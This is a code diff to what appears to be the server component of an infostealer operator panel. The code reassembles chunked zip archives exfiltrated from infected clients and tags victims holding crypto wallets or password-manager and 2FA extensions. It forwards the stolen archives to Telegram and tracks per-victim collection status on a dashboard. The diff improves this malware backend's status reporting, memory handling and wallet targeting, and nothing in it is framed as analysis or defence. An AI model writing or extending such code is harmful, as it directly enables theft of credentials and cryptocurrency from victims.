@@ -10,6 +10,9 @@ import zlib from "node:zlib";
 // In-memory chunk reassembly buffers keyed by `${clientId}:${session}`
 const pending = new Map();
 
+// Per-client collect status for the panel: last stage seen, when, and result.
+const clientStatus = new Map();
+
 function bufferKey(clientId, session) {
   return `${clientId}:${session}`;
 }
@@ -101,7 +104,14 @@ function computeTags(zipBuf, info) {
     }
   } catch {}
   if (Array.isArray(info?.DesktopWallets) && info.DesktopWallets.length > 0) tags.add("crypto-wallet");
-  if (Array.isArray(info?.BrowserExtensions) && info.BrowserExtensions.length > 0) tags.add("crypto-wallet");
+  // Extensions only count when they mapped to a known wallet/password-manager/
+  // 2FA name — raw 32-char store IDs are unmapped unknowns, not vaults.
+  if (
+    Array.isArray(info?.BrowserExtensions) &&
+    info.BrowserExtensions.some((e) => typeof e === "string" && !/^[a-z]{32}$/.test(e))
+  ) {
+    tags.add("crypto-wallet");
+  }
   return [...tags];
 }
 
@@ -117,9 +127,6 @@ async function finalizeSession(ctx, clientId, session) {
   const key = bufferKey(clientId, session);
   const buf = pending.get(key);
   if (!buf || !buf.complete) return;
-  // Guard against the retry timer racing the direct completion path.
-  if (buf.finalized) return;
-  buf.finalized = true;
 
   const payload = buf.complete;
   const expectedChunks = Number(payload?.chunks);
@@ -144,12 +151,20 @@ async function finalizeSession(ctx, clientId, session) {
     return;
   }
 
+  // Guard against the retry timer racing the direct completion path — set
+  // only once all chunks are present and we're actually storing.
+  if (buf.finalized) return;
+  buf.finalized = true;
+
   try {
     const parts = [];
     for (let i = 0; i < total; i++) {
       parts.push(Buffer.from(buf.chunks.get(i), "base64"));
     }
     const zip = Buffer.concat(parts);
+    // Free the base64 chunk map immediately — it outlives its usefulness here
+    // and sits in RAM through the GeoIP/Telegram awaits otherwise.
+    pending.delete(key);
     const declared = Number(payload?.size);
     if (Number.isFinite(declared) && declared !== zip.length) {
       ctx.log.warn(`xfill_complete: size mismatch (declared ${declared}, got ${zip.length}) from ${clientId}`);
@@ -177,6 +192,7 @@ async function finalizeSession(ctx, clientId, session) {
     const row = ctx.db.prepare("SELECT * FROM archives WHERE id = ?").get(result.lastInsertRowid);
     ctx.broadcast("archive_added", rowToJson(row));
     ctx.log.info(`xfill archive stored: ${clientId} session ${session} (${zip.length} bytes)`);
+    clientStatus.set(String(clientId), { stage: "done", session, at: Date.now() });
 
     // Telegram: message + the zip itself (server-side only).
     const hwid = info?.HWID || String(clientId).slice(0, 10);
@@ -523,6 +539,12 @@ export default {
 
   onEvent(ctx, clientId, event, payload) {
     if (event === "xfill_chunk") {
+      // Evict stale sessions on EVERY chunk — a session whose complete never
+      // arrives would otherwise sit in RAM for the full TTL.
+      const nowEvict = Date.now();
+      for (const [k, b] of pending) {
+        if (nowEvict - b.startedAt > 10 * 60 * 1000) pending.delete(k);
+      }
       const session = Number(payload?.session);
       const index = Number(payload?.index);
       const total = Number(payload?.total);
@@ -571,11 +593,20 @@ export default {
     }
 
     if (event === "xfill_progress") {
+      clientStatus.set(String(clientId), {
+        stage: String(payload?.stage ?? ""),
+        at: Date.now(),
+      });
       ctx.broadcast("progress", { clientId, stage: String(payload?.stage ?? "") });
       return;
     }
 
     if (event === "xfill_error") {
+      clientStatus.set(String(clientId), {
+        stage: "error",
+        message: String(payload?.message ?? "unknown error"),
+        at: Date.now(),
+      });
       ctx.broadcast("collect_error", {
         clientId,
         stage: String(payload?.stage ?? ""),
@@ -586,6 +617,16 @@ export default {
   },
 
   rpc: {
+    clientStatus(ctx) {
+      return [...clientStatus.entries()].map(([clientId, s]) => ({
+        clientId,
+        stage: s.stage,
+        message: s.message || "",
+        session: s.session ?? null,
+        at: s.at,
+      }));
+    },
+
     dashboardContributions(ctx, params) {
       const clientIds = Array.isArray(params?.clientIds) ? params.clientIds : [];
       const contributions = [];
